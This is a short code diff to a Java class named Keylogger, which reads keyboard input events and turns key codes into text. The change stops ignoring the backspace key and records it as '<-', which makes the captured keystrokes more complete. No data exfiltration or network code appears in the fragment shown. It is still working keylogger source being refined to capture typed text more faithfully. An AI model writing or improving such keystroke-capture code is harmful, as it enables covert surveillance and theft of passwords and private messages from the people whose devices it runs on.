@@ -76,7 +76,7 @@ public class Keylogger {
                 String[] ignoredKeys = {
                         "BTN_TOUCH", "KEY_LEFTALT", "KEY_RIGHTALT", "KEY_LEFTCTRL", "KEY_RIGHTCTRL",
                         "KEY_LEFTSHIFT", "KEY_RIGHTSHIFT", "KEY_CAPSLOCK", "KEY_MENU", "KEY_FN",
-                        "KEY_POWER", "KEY_SLEEP", "KEY_BACKSPACE"
+                        "KEY_POWER", "KEY_SLEEP"
                 };
                 String line;
                 while ((line = reader.readLine()) != null) {
@@ -92,8 +92,9 @@ public class Keylogger {
                                 key = " ";
                             } else if ("KEY_APOSTROPHE".equals(keyCode)){
                                 key = "'";
-                            }
-                            else if ("KEY_ENTER".equals(keyCode)) {
+                            } else if ("KEY_BACKSPACE".equals(keyCode)) {
+                                key = "<-";
+                            } else if ("KEY_ENTER".equals(keyCode)) {
                                 key = "\n";
                             } else if ("KEY_TAB".equals(keyCode)) {
                                 key ="\t";
